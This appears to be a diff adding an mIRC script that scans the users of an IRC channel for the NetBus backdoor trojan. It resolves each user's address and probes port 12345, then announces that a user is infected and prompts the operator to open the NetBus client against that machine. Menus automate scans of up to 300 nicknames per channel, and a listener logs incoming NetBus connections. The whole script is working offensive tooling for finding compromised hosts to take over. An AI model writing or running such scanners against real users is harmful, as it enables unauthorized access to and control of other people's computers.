@@ -1,0 +1,91 @@
+#nbscandns off
+on 1:dns: {
+  set %bususer [ $iaddress ] 
+  set %busnick $nick 
+  set %socksock net $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) 
+  sockopen %socksock $iaddress 12345 
+}
+#nbscandns end
+
+on 1:socklisten:kemik:{
+  if ($nick = $me) { echo -a Press on your power switch to make me happy !!! }
+  set %sockinfo $sock( kemik ).ip | /echo -a 4,1Netbus attempt of connection from [ %sockinfo ] 
+}
+on 1:sockopen:net*:{
+  if ($sockerr > 0) { halt }
+  if ($sockerr = 0) { 
+    echo -a 6 $+ %busnick 1 [ $sock( $sockname ).ip ] 5on1 %kanalbas 5Is Infected of NetBus 1[F7 to open NetBus Client] | /splay $mircdirsounds\wavs\netbus.wav
+    sockclose $sockname 
+  }
+}
+
+alias bakbebaba {
+  set %kanalbas $1
+  window -an @NetBusScan
+  ;  echo @NetBusScan 8,12Scansione 8,4 [ %kanalbas ] 8,12Nicks da %kaçýncý $+ . to $calc( %kaçýncý + 10 ) $+ .
+  set %sayarým 0
+  set %kaçýncý $2
+  :loop
+  inc %sayarým
+  set %yolla $nick( %kanalbas,$calc( %kaçýncý + %sayarým ) )
+  if (%yolla = $me) || (%yolla = W) || (%yolla = X) || (%yolla = Chanserv) { goto nodns }
+
+  :dns
+  dns %yolla 
+  goto hadi
+
+  :nodns
+
+  :hadi
+  if (%sayarým = 10) { halt }
+  goto loop  
+}
+
+
+
+
+menu nicklist,channel {
+  NetBus Scan
+  .Scan 1-50
+  ..Scan 1-10:/bakbebaba # 0
+  ..Scan 11-20:/bakbebaba # 10
+  ..Scan 21-30:/bakbebaba # 20
+  ..Scan 31-40:/bakbebaba # 30
+  ..Scan 41-50:/bakbebaba # 40
+  .Scan 51-100
+  ..Scan 51-60:/bakbebaba # 50
+  ..Scan 61-70:/bakbebaba # 60
+  ..Scan 71-80:/bakbebaba # 70
+  ..Scan 81-90:/bakbebaba # 80
+  ..Scan 91-100:/bakbebaba # 90
+  .Scan 101-200
+  ..Scan 101-110:/bakbebaba # 100
+  ..Scan 111-120:/bakbebaba # 110
+  ..Scan 121-130:/bakbebaba # 120
+  ..Scan 131-140:/bakbebaba # 130
+  ..Scan 141-150:/bakbebaba # 140
+  ..Scan 151-160:/bakbebaba # 150
+  ..Scan 161-170:/bakbebaba # 160
+  ..Scan 171-180:/bakbebaba # 170
+  ..Scan 181-190:/bakbebaba # 180
+  ..Scan 191-200:/bakbebaba # 190
+  .Scan 201-300
+  ..Scan 201-210:/bakbebaba # 200
+  ..Scan 211-220:/bakbebaba # 210
+  ..Scan 221-230:/bakbebaba # 220
+  ..Scan 231-240:/bakbebaba # 230
+  ..Scan 241-250:/bakbebaba # 240
+  ..Scan 251-260:/bakbebaba # 250
+  ..Scan 261-270:/bakbebaba # 260
+  ..Scan 271-280:/bakbebaba # 270
+  ..Scan 281-290:/bakbebaba # 280
+  ..Scan 291-300:/bakbebaba # 290
+  .-
+  .NetBus Options
+  ..On Join
+  ...%nbsonjoin:/set %nbsonjoin [ON] | /set %nbsonjoin2 Off | .enable #netbus1
+  ...%nbsonjoin2:/set %nbsonjoin On | /set %nbsonjoin2 [OFF] | .disable #netbus1
+  ..On DNS
+  ...%nbsondns:/set %nbsondns [ON] | /set %nbsondns2 Off | .enable #nbscandns
+  ...%nbsondns2:/set %nbsondns On | /set %nbsondns2 [OFF] | .disable #nbscandns
+}
